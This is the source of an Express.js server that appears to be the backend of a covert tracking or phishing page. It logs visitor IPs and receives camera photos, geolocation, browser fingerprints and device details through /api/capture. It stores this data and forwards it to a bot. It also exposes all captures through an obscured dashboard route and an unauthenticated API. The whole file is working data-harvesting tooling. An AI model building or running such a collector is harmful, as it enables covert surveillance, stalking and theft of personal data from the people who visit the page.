require('dotenv').config();

const path = require('path');
const express = require('express');
const { startBot, sendCapture } = require('./bot');
const { recordVisit, saveCapture, getCaptures, getStats } = require('./storage');

const app = express();
const PORT = Number(process.env.PORT || 3000);

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json({ limit: '30mb' }));
app.use(express.urlencoded({ extended: true, limit: '30mb' }));
app.use('/data/photos', express.static(path.join(__dirname, 'data', 'photos')));

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  if (req.headers['x-real-ip']) return req.headers['x-real-ip'];
  let ip = req.socket.remoteAddress || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  if (ip === '::1') ip = '127.0.0.1';
  return ip || 'Tidak tersedia';
}

app.get('/', (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Tidak tersedia';
  recordVisit({ ip, userAgent, timestamp: new Date().toISOString(), type: 'page_view' });
  res.render('index', { ip, userAgent });
});

app.get('/d4sh', (req, res) => {
  res.render('dashboard');
});

app.get('/api/stats', (req, res) => {
  const stats = getStats();
  res.json({
    total: stats.total,
    uniqueIps: stats.uniqueIps,
    captures: stats.captures,
    photos: stats.photos,
    uniqueCities: stats.uniqueCities
  });
});

app.get('/api/captures', (req, res) => {
  res.json({ captures: getCaptures() });
});

app.post('/api/capture', async (req, res) => {
  try {
    const body = req.body || {};
    const photos = Array.isArray(body.photos) ? body.photos : [];
    const location = body.location || null;

    if (!photos.length && !location) {
      return res.status(400).json({ ok: false, message: 'Tidak ada data yang diterima' });
    }

    const payload = {
      ip: getClientIp(req),
      userAgent: req.headers['user-agent'] || 'Tidak tersedia',
      acceptLanguage: req.headers['accept-language'] || null,
      photos,
      location,
      city: body.city || null,
      network: body.network || null,
      battery: body.battery || null,
      storage: body.storage || null,
      webgl: body.webgl || null,
      userAgentData: body.userAgentData || null,
      mediaDevices: body.mediaDevices || null,
      permissions: body.permissions || null,
      canvasFingerprint: body.canvasFingerprint || null,
      fonts: body.fonts || null,
      plugins: body.plugins || null,
      clientTime: body.clientTime || null,
      serverTime: new Date().toISOString(),
      clientLanguage: body.clientLanguage || null,
      languages: body.languages || null,
      platform: body.platform || null,
      vendor: body.vendor || null,
      screen: body.screen || null,
      viewport: body.viewport || null,
      colorDepth: body.colorDepth || null,
      pixelRatio: body.pixelRatio || null,
      orientation: body.orientation || null,
      touchSupport: body.touchSupport !== undefined ? body.touchSupport : null,
      maxTouchPoints: body.maxTouchPoints || null,
      timezone: body.timezone || null,
      timezoneOffset: body.timezoneOffset !== undefined ? body.timezoneOffset : null,
      deviceMemory: body.deviceMemory || null,
      hardwareConcurrency: body.hardwareConcurrency || null,
      cookiesEnabled: body.cookiesEnabled !== undefined ? body.cookiesEnabled : null,
      doNotTrack: body.doNotTrack || null,
      referrer: body.referrer || null,
      pageUrl: body.pageUrl || null,
      isSecureContext: body.isSecureContext !== undefined ? body.isSecureContext : null
    };

    saveCapture(payload);
    await sendCapture(payload);

    recordVisit({
      ip: payload.ip,
      userAgent: payload.userAgent,
      timestamp: payload.serverTime,
      type: 'capture'
    });

    res.json({ ok: true });
  } catch (err) {
    console.error('Kesalahan pengiriman:', err.message);
    res.status(500).json({ ok: false, message: err.message });
  }
});

app.get('/health', (req, res) => {
  const stats = getStats();
  res.json({
    status: 'aktif',
    uptime: process.uptime(),
    total: stats.total,
    unique: stats.uniqueIps,
    captures: stats.captures
  });
});

startBot();

app.listen(PORT, () => {
  const stats = getStats();
  console.log(`semua aman`)
  console.log(`berjalan di port ${PORT}`);
});